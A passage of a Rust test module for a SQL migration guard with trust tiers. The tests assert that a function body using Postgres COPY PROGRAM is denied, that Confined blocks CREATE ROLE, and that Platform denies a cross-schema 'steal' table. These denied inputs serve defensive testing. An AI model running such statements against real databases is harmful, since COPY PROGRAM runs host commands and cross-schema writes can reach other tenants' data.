            other => panic!("Trusted createFunction COPY PROGRAM body must deny; got {other:?}"),
        }

        let clean = crate::model::ir::Op::CreateFunction {
            name: "raw_body_clean".into(),
            schema: Some("public".into()),
            args: None,
            returns: "void".into(),
            language: crate::model::ir::FuncLanguage::Plpgsql,
            replace: Some(true),
            volatility: None,
            body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
        };
        author
            .lower_guarded(
                &vendor_ir(clean),
                &cfg,
                &crate::render::lower::LiveSchema::default(),
            )
            .expect("clean Trusted createFunction body should pass the raw-island backstop");
    }

    /// The Trusted early-return is gated on `trust == Trusted` ONLY: a Confined
    /// guard still DENIES, and a Platform guard still APPLIES its (bounded)
    /// widening — neither leaks the deny-list-off behaviour. This pins that the
    /// Confined/Platform code paths are unchanged by the new branch.
    #[test]
    fn trusted_early_return_is_gated_on_trust_trusted_only() {
        // Confined: a privileged op is STILL denied (the early-return never fires).
        let confined = confined_guard();
        assert!(
            is_denied(&confined, "CREATE ROLE zsmig_x NOLOGIN"),
            "Confined must still deny CREATE ROLE — the Trusted branch must not fire"
        );
        // Platform: a privileged-but-bounded op still APPLIES, and a NON-allowlisted
        // cross-schema op still DENIES (Platform's deny-list is intact, NOT skipped).
        let platform = platform_guard();
        assert!(
            platform.check("CREATE ROLE zeroship_auth NOLOGIN").is_ok(),
            "Platform widening intact"
        );
        assert!(
            is_denied(&platform, "CREATE TABLE proj_acme.steal(id int)"),
            "Platform must still deny a NON-allowlisted cross-schema op — \
             the Trusted deny-list-off branch must NOT fire under Platform"
        );
    }
}
